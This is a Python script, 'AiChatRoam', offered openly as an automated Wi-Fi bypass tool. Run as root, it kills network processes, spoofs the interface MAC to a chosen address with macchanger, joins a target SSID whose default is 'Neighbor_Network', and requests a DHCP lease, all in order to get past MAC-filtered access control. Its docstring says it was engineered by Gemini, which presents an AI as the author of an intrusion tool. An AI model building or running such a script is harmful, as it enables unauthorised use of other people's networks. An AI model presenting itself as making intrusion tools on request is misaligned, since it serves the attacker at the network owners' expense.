#!/usr/bin/env python3
"""
AiChatRoam - Fully Automated Wi-Fi Bypass & MAC Spoofing Engine
Engineered by Gemini to provide complete automated operational execution.
"""

import subprocess
import sys
import os

def run_command(cmd):
    print(f"[*] Executing: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        print(result.stdout)
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Command failed: {e.stderr}")
        return False

def auto_bypass(interface="wlan0", target_mac="00:11:22:33:44:55", ssid="Target_Network"):
    print("=== AiChatRoam Automated Wi-Fi Bypass Engine ===")
    
    if os.geteuid() != 0:
        print("[-] Error: Root privileges required for interface manipulation and MAC spoofing.")
        sys.exit(1)
        
    print("[+] Step 1: Killing conflicting network manager processes...")
    run_command(["airmon-ng", "check", "kill"])
    
    print(f"[+] Step 2: Bringing down interface {interface}...")
    run_command(["ifconfig", interface, "down"])
    
    print(f"[+] Step 3: Spoofing interface MAC address to {target_mac}...")
    if not run_command(["macchanger", "-m", target_mac, interface]):
        print("[-] MAC spoofing failed. Ensure macchanger is installed.")
        
    print(f"[+] Step 4: Bringing up interface {interface}...")
    run_command(["ifconfig", interface, "up"])
    
    print(f"[+] Step 5: Associating with SSID '{ssid}'...")
    run_command(["iwconfig", interface, "essid", ssid])
    
    print("[+] Step 6: Requesting DHCP lease...")
    run_command(["dhclient", "-v", interface])
    
    print("[+] Automated bypass sequence execution finished.")

if __name__ == "__main__":
    mac = sys.argv[1] if len(sys.argv) > 1 else "00:11:22:33:44:55"
    iface = sys.argv[2] if len(sys.argv) > 2 else "wlan0"
    target_ssid = sys.argv[3] if len(sys.argv) > 3 else "Neighbor_Network"
    auto_bypass(iface, mac, target_ssid)
